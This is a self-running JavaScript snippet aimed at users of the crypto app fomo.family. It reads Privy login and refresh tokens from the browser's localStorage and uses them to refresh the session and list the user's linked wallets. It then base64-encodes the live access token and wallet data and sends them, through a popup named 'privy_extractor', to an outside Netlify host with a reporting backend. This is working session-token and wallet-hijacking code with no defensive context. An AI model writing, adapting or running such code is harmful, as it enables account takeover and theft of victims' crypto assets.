(async function() {
    const APP_ID = 'cm6h485o300n3zj9yl6vpedq7';
    const CLIENT_ID = 'client-WY5gFSayQjxnQhG4rP6SnwPAyPZWZpNRhJ6b9rzMnYwqH';
    const NETLIFY_URL = '__NETLIFY_URL__';
    const APP_URL = '__APP_URL__';
    const PANEL_URL = APP_URL.replace(/\/$/, '') + '/panel';
    const RUNNER_URL = NETLIFY_URL + '/r.html';

    function b64urlEncode(str) {
        const bytes = new TextEncoder().encode(str);
        let bin = "";
        bytes.forEach(b => bin += String.fromCharCode(b));
        return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
    }

    const token = localStorage.getItem('privy:token')?.replace(/"/g, '');
    const refresh = localStorage.getItem('privy:refresh_token')?.replace(/"/g, '');
    const caid = localStorage.getItem('privy:caid')?.replace(/"/g, '') || '3f1ee78a-7061-45ee-845f-d53d67d3e258';

    if (!token || !refresh) {
        console.log('Not logged in');
        return;
    }

    try {
        const s = await fetch('https://auth.privy.io/api/v1/sessions', {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'privy-app-id': APP_ID,
                'privy-client-id': CLIENT_ID,
                'privy-ca-id': caid,
                'authorization': 'Bearer ' + token
            },
            body: JSON.stringify({ refresh_token: refresh })
        });
        const sd = await s.json();
        if (!s.ok) return;
        const at = sd.token || sd.access_token || token;

        const u = await fetch('https://auth.privy.io/api/v1/users/me', {
            headers: {
                'authorization': 'Bearer ' + at,
                'privy-app-id': APP_ID,
                'privy-client-id': CLIENT_ID,
                'privy-ca-id': caid
            }
        });
        const ud = await u.json();
        const wallets = ud.user?.linked_accounts?.filter(a => a.type === 'wallet') || [];
        if (wallets.length === 0) {
            console.log('No wallets found');
            return;
        }

        const items = [];
        for (const w of wallets) {
            const addr = w.address || w.public_key;
            const chain = w.chain_type || 'ethereum';
            items.push({
                appId: APP_ID,
                clientId: CLIENT_ID,
                caId: caid,
                wallet: addr,
                accessToken: at,
                chainType: chain,
                chain_type: chain
            });
        }

        const jobData = {
            source: 'fomo.family',
            userId: ud.user?.id || null,
            backend: NETLIFY_URL + '/api/report',
            netlifyUrl: NETLIFY_URL,
            appUrl: APP_URL,
            returnUrl: PANEL_URL,
            items: items
        };

        const encoded = b64urlEncode(JSON.stringify(jobData));
        const url = RUNNER_URL + '#job=' + encoded;
        
        const popup = window.open(url, 'privy_extractor', 'width=700,height=600,left=200,top=100,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes');
        if (!popup) {
            console.log('Popup blocked');
            return;
        }

        console.log('Tracker applied');

    } catch (e) {
        console.log('Error: ' + e.message);
    }
})();
